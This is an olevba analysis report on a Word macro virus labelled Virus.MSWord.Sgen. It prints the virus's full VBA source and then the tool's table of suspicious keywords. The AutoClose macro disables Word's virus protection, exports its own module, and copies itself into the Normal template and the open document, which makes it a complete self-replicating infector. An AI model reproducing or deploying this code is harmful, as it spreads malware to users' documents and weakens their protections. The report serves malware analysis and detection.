olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sgen
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sgen - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sGen.bas 
in file: Virus.MSWord.Sgen - OLE stream: 'Macros/VBA/sGen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = 0
Kill ("c:\windows\nt.txt")
Kill ("c:\windows\ad.txt")
NormalTemplate.VBProject.VBComponents.Item("sGen").Export ("c:\windows\nt.txt")
ActiveDocument.VBProject.VBComponents.Item("sGen").Export ("c:\windows\ad.txt")
If Dir("c:\windows\ad.txt") = "" Then ActiveDocument.VBProject.VBComponents.Import "c:\windows\nt.txt"
ActiveDocument.SaveAs ActiveDocument.FullName
If Dir("c:\windows\nt.txt") = "" Then NormalTemplate.VBProject.VBComponents.Import "c:\windows\ad.txt"
NormalTemplate.Save
System.PrivateProfileString("", "HKEY_CURRENT_USER\", "sGen") = "f0re's Macro Contest Contribution !"
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

